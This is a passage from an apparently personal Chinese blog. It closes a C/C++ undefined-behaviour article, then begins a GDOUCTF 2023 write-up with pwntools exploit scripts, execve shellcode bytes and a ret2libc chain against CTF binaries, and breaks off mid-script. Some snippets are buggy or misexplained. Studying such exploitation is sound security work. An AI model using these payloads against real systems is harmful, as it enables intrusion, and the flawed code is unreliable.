Args&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string_view fmt_str, Args&amp;&amp;... args)</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> fmt_args&#123; std::<span class="hljs-built_in">make_format_args</span>(args...) &#125;;<br>std::string outstr&#123; std::<span class="hljs-built_in">vformat</span>(fmt_str, fmt_args) &#125;;<br><span class="hljs-built_in">fputs</span>(outs.<span class="hljs-built_in">c_str</span>(), stdout);<br>&#125;<br></code></pre></td></tr></table></figure><p>选自 mq白cpp BV1gx4y1g7AJ</p><h2 id="一些额外的、相对来说并不安全的函数"><a href="#一些额外的、相对来说并不安全的函数" class="headerlink" title="一些额外的、相对来说并不安全的函数"></a>一些额外的、相对来说并不安全的函数</h2><p>在string头文件中有一个replace函数，这个函数用法非常的多，共有6种。只需要知道这个函数可以替换字符串中的一段字串换为另一段字符串即可，即程序中只要存在类似于如下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">fgets</span>(str, <span class="hljs-number">20</span>, stdin);<br>string a, b;<br>a = <span class="hljs-string">&quot;a&quot;</span>;<br>b = <span class="hljs-string">&quot;bb&quot;</span>;<br><span class="hljs-built_in">replace</span>((string *)(&amp;str), (string *)(&amp;a), (string *)(&amp;b));<br></code></pre></td></tr></table></figure><p>这样的话，如果向str中输入20个字符，如果其中有”a”这个字串，就会被替换为”bb”，进而造成非直接的栈溢出。</p><h2 id="结构体（类）相关"><a href="#结构体（类）相关" class="headerlink" title="结构体（类）相关"></a>结构体（类）相关</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">A</span> &#123;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;Hello\n&quot;</span>; &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>A *a = <span class="hljs-keyword">new</span> A;<br>    a-&gt;<span class="hljs-built_in">f</span>();<span class="hljs-comment">// 可以正常调用输出Hello</span><br>    A *a2 = <span class="hljs-literal">nullptr</span>;<br>    a2-&gt;<span class="hljs-built_in">f</span>(); <span class="hljs-comment">// 大多数编译器反函数编译后也可以正常输出Hello，属于ub 解用了空指针</span><br>&#125;<br></code></pre></td></tr></table></figure><p>所以在C++中设计了析构函数来避免其发生：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123; cout &lt;&lt; <span class="hljs-string">&quot;Hello\n&quot;</span>; &#125;<br>~<span class="hljs-built_in">A</span>();<br>&#125;;<br>A::~<span class="hljs-built_in">A</span>(<span class="hljs-type">void</span>) &#123; cout &lt;&lt; <span class="hljs-string">&quot;del A\n&quot;</span>; &#125;<br></code></pre></td></tr></table></figure><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2><h3 id="指针free后不置空"><a href="#指针free后不置空" class="headerlink" title="指针free后不置空"></a>指针free后不置空</h3><p>包含了delete后和realloc(0)后不置空，如以下程序代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">name</span> &#123;</span><br>    <span class="hljs-type">char</span> *myname;<br>    <span class="hljs-type">void</span> (*func)(<span class="hljs-type">char</span> *str);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, str);&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    name *a;<br>    a = (name *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(name));<br>    a-&gt;func = print;<br>    a-&gt;myname = <span class="hljs-string">&quot;hello&quot;</span>;<br>    a-&gt;func(<span class="hljs-string">&quot;printfunc&quot;</span>);<span class="hljs-comment">// 调用print函数输出&quot;printfunc\n&quot;</span><br>    <span class="hljs-built_in">free</span>(a);<br>    a-&gt;func(<span class="hljs-string">&quot;2nd time 2 use but free&quot;</span>); <span class="hljs-comment">// 调用print函数输出&quot;2nd time 2 use but free\n&quot;</span><br>    a = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;next line will not be printed\n&quot;</span>);<br>    a-&gt;func(<span class="hljs-string">&quot;hello&quot;</span>);<span class="hljs-comment">// 在此core dumped，segmentation fault了，段错误就是访问不可访问区了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="一些开发上的小技巧"><a href="#一些开发上的小技巧" class="headerlink" title="一些开发上的小技巧"></a>一些开发上的小技巧</h2><h3 id="C-x2F-C-1"><a href="#C-x2F-C-1" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h3><h4 id="判断当前程序运行位数"><a href="#判断当前程序运行位数" class="headerlink" title="判断当前程序运行位数"></a>判断当前程序运行位数</h4><blockquote><p>sizeof void</p><p>sizeof long</p></blockquote><p>以上两个都是在32位环境下为4，在64位环境下为8</p><p>有时为了避免由于整形的位数带来的问题，会使用stdint.h头文件中的内容来规范标准。</p><h4 id="判断系统大小端"><a href="#判断系统大小端" class="headerlink" title="判断系统大小端"></a>判断系统大小端</h4><p>大小端分别指数据的高字节保存在地址的高地址和低地址中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">checkEndian</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b;<br>    &#125;c;<br>    c.a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> == c.b;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码表示如果返回1就为使用小端法的CPU，返回false就为使用大端法的CPU。</p><h2 id="ub的避免"><a href="#ub的避免" class="headerlink" title="ub的避免"></a>ub的避免</h2><p>ub，即Undefined Behavior，是一类对程序无任何限制的行为。理论上纵容这种代码的编写是危险的。我们要多去阅读官方提供的开发者文档以及支持的项目文档等等，多接触更新的、更安全的、更全面的现代语言标准，不断提高自己的代码审计能力，在平时的编写过程中就对ub零容忍，才能写出完美的代码。</p><h2 id="为什么现在的开发者讨厌甚至不愿意去接触类C语言？"><a href="#为什么现在的开发者讨厌甚至不愿意去接触类C语言？" class="headerlink" title="为什么现在的开发者讨厌甚至不愿意去接触类C语言？"></a>为什么现在的开发者讨厌甚至不愿意去接触类C语言？</h2><p><strong>其中有一个很重要的原因就是很讨厌其中的隐式转换。</strong></p><p>在早期的语言设计中，术语习惯非常混乱，部分早期编译器甚至直接将const——我们常认为是常量的定义方式而定义的变量，直接扔在有读写权限的bss段中，而不是现在逐渐标准化后放在readonly区。在类C语言的发展长河中，直到ISO C++的出现，才出现了对于name（名称）、denote（指称）以及entity（实体）的语法范畴的构造。</p><p>有人给我发过这样的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>])</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size = %d\n&quot;</span>, <span class="hljs-keyword">sizeof</span> arr);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>];<br>    test(arr);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后由于在64位程序下输出8，就混乱了。但其实是在main函数中传了一个&amp;arr，而test函数又以数组类型接收，但由于ub，打印时候arr会被识别为指针——是的没错，这里ub了。在main函数中arr处甚至可以声明为arr[5]、arr[20]等等，传递时可能存在风险，但编译器并没有制止这种行为。</p><p>跟我比较熟的人可能听过我说过：数组名不是指针，也不是什么地址。这其实是在开发者文档里是可以找得到的，在C++ Primer Plus上也有这样一段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">对数组取地址时，数组名也不会被解释为其地址。等等，数组名难道不被解释为数组的地址吗？不完全如此：数组名被解释为其第一个元素的地址，而对数组名应用地址运算符时，得到的是整个数组的地址：<br>short tell[10];<br>cout &lt;&lt; tell &lt;&lt; endl;// displays &amp;tell[0]<br>cout &lt;&lt; &amp;tell &lt;&lt; endl;// displays address of whole array<br>从数字上说，这两个地址相同；但从概念上说，&amp;tell[0]（即tell）是一个2字节内存块的地址，而&amp;tell是一个20字节内存块的地址。因此，表达式tell+1将地址值加2，而表达式&amp;tell+2将地址加20。换句话说，tell是一个short指针（*short），而&amp;tell是一个这样的指针，即指向包含20个元素的short数组（short(*)[20]）。<br>您可能会问，前面有关&amp;tell的类型描述是如何来的呢？首先，您可以这样声明和初始化这种指针：<br>short (*pas)[20] = &amp;tell;<br>如果省略括号，优先级规则将使得pas先与[20]结合，导致pas是一个short指针数组，它包含20个元素，因此括号是必不可少的。其次，如果要描述变量的类型，可将声明中的变量名删除。因此，pas的类型为short (*)[20]。另外，由于pas被设置为&amp;tell，因此*pas与tell等价，所以(*pas)[0]为tell数组的第一个元素。<br></code></pre></td></tr></table></figure><p>由于在C++中规范了这一类行为，所以我们可以利用一些从C++11起步的特性去判断类型了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>]&#123;&#125;;<br><span class="hljs-keyword">using</span> T1 = <span class="hljs-keyword">decltype</span>(arr);<span class="hljs-comment">// 数组类型</span><br><span class="hljs-keyword">using</span> T2 = <span class="hljs-keyword">decltype</span>(+arr);<span class="hljs-comment">// 由于隐式类型转换，此处为ptr</span><br><span class="hljs-keyword">using</span> T3 = <span class="hljs-keyword">decltype</span>(f);<span class="hljs-comment">// 函数类型</span><br><span class="hljs-keyword">using</span> T4 = <span class="hljs-keyword">decltype</span>(+f);<span class="hljs-comment">// 隐式类型转换</span><br><span class="hljs-comment">// printf(&quot;%d\n&quot;, sizeof(f));  这个是不能过编译的</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(+f));<span class="hljs-comment">// 这个可以过编译，因为有隐式类型转换</span><br><br>    std::cout &lt;&lt; std::boolalpha;<span class="hljs-comment">// 设定布尔值以boolalpha（true false）形式输出</span><br>    std::cout &lt;&lt; std::is_same&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;::value &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<span class="hljs-comment">// true</span><br>    std::cout &lt;&lt; std::is_same&lt;<span class="hljs-type">int</span>, <span class="hljs-type">void</span>&gt;::value &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<span class="hljs-comment">// false</span><br>    std::cout &lt;&lt; std::is_same&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>[]&gt;::value &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<span class="hljs-comment">// false</span><br>    std::cout &lt;&lt; std::is_same&lt;<span class="hljs-type">int</span>[], <span class="hljs-type">int</span>*&gt;::value &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<span class="hljs-comment">// false</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>由于is_same_v模板是在ISO C++17于GCC中声明的，而在C++14及至今版本，使用变量模板以及类偏特化仍可以编写一个is_same_v模板：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">T2</span>&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">is_same</span> &#123;<br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">bool</span> value = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">is_same</span>&lt;T, T&gt; &#123;<br><span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">bool</span> value = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">T2</span>&gt;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">bool</span> is_same_v = is_same&lt;T, T2&gt;::value;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Test</span>&#123;&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::cout &lt;&lt; is_same&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;::value &lt;&lt; std::endl;<br>std::cout &lt;&lt; is_same_v&lt;<span class="hljs-type">double</span>, <span class="hljs-type">double</span>&gt; &lt;&lt; std::endl;<br>std::cout &lt;&lt; is_same_v&lt;Test, <span class="hljs-type">double</span>&gt; &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>还有更多复杂的内容：</strong></p><p>例如不求值表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::cout &lt;&lt; <span class="hljs-built_in">sizeof</span>(std::cout&lt;&lt;<span class="hljs-string">&#x27;*&#x27;</span>&lt;&lt;&amp;std::cout&lt;&lt;std::endl)&lt;&lt;<span class="hljs-string">&#x27;\n&#x27;</span>;<br><span class="hljs-comment">//272</span><br>std::cout &lt;&lt; <span class="hljs-keyword">sizeof</span> std::cout&lt;&lt;<span class="hljs-string">&#x27;*&#x27;</span>&lt;&lt;&amp;std::cout&lt;&lt;std::endl;<br><span class="hljs-comment">//272*00007FF8E1D72FD0</span><br></code></pre></td></tr></table></figure><p>sizeof会把后面跟着的表达式的类型大小计算出来，括号中的内容编译后用结果替代掉原表达式。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>就写这么多了，从二进制漏洞的做题中有感，选出了对开发可能用得上的内容，希望大家未来开发自己的应用程序或者写脚本等的时候能够注重各个语言的标准与规范，对于内存的管理能够更加安全且更加高效，对于语言中变量的类型能够有一定的心得与体会。我们虽然在网络空间安全方向上进行深入发展，但开发是我们的基本能力，我们并不应该摒弃开发能力，毕竟真要行情不好还完全可以靠开发吃饭（划掉），毕竟有开发能力才会有一定的代码审计能力，才会比别人更快地发现并修复漏洞。</p><blockquote><p>部分内容改自mq白cpp的bilibili个人空间<a href="https://space.bilibili.com/1292761396/dynamic">https://space.bilibili.com/1292761396/dynamic</a><br>部分内容选自C++ Primer Plus<br>部分内容选自cppreference</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDOUCTF 2023 WP</title>
    <link href="/2023/04/17/GDOUCTF-2023-WP/"/>
    <url>/2023/04/17/GDOUCTF-2023-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="GDOUCTF-2023-WP"><a href="#GDOUCTF-2023-WP" class="headerlink" title="GDOUCTF 2023 WP"></a>GDOUCTF 2023 WP</h1><h2 id="EASY-PWN"><a href="#EASY-PWN" class="headerlink" title="EASY PWN"></a>EASY PWN</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+7h] [rbp-29h] BYREF</span><br>    <span class="hljs-type">char</span> s1[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+11h] [rbp-1Fh] BYREF</span><br>    <span class="hljs-type">ssize_t</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>    <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>    v5 = <span class="hljs-number">0</span>;<br>    fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can&#x27;t access /dev/urandom.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>    v3 = read(fd, buf, <span class="hljs-number">0xA</span>uLL);<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Data not received from /dev/urandom&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>    close(fd);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Password:&quot;</span>);<br>    gets(s1);<br>    result = <span class="hljs-built_in">strcmp</span>(s1, buf);<br>    <span class="hljs-keyword">if</span> ( result )<br>      result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I swore that was the right password ...&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      v5 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Guess I couldn&#x27;t gaslight you!&quot;</span>);<br>      <span class="hljs-keyword">return</span> print_flag();<br>  &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<span class="hljs-comment">// check</span><br></code></pre></td></tr></table></figure><p>原本想尝试下libc的，这下好了，不知道怎么就过了，可以尝试调试一下，我还不是很明白这个。好像正常思路是直接爆破pie的低位，1&#x2F;16的概率，但是这个程序还是urandom应该是有bug，不是很懂，后面研究明白了再细说。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./ep&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ep&#x27;</span>)<br>prdir = <span class="hljs-number">0x13db</span><br>ret = <span class="hljs-number">0x1016</span><br>io.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x1f</span>+p64(<span class="hljs-number">0xdeadbeef</span>)+p64(prdir)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+6h] [rbp-Ah] BYREF</span><br><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  mprotect((&amp;<span class="hljs-built_in">stdout</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL), <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please.&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;name, <span class="hljs-number">0x25</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nice to meet you.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s start!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">64uLL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>最开始写了shellcode型的，去Exploit Database找的37字长的shellcode，不知道为什么没解出来，可能那个sc有问题？还是说不需要经过ret栈对齐就直接ret2就行了？</p><h3 id="sc原EXP（未打通）："><a href="#sc原EXP（未打通）：" class="headerlink" title="sc原EXP（未打通）："></a>sc原EXP（未打通）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./sc&#x27;</span>)<br>shellcode = <span class="hljs-string">b&#x27;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#x27;</span><br>io.send(shellcode)<br>io.sendlineafter(<span class="hljs-string">b&#x27;start!\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span>)+p64(<span class="hljs-number">0x40028e</span>)+p64(<span class="hljs-number">0x6010A0</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>后面数了下，装ROP链做ret2libc够用，就ret2libc了。靶机环境是<strong>0 - libc6_2.27-3ubuntu1_amd64</strong>。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./sc&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./sc&#x27;</span>)<br><br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 没用上，后面其实可以用</span><br><br>prdir = <span class="hljs-number">0x4007b3</span> <br>ret = <span class="hljs-number">0x40028e</span><br><span class="hljs-comment"># leak libc </span><br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span>+p64(prdir)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>io.recvuntil(<span class="hljs-string">b&#x27;start!\n&#x27;</span>)<br><br>puts_addr = u64(io.recvuntil(<span 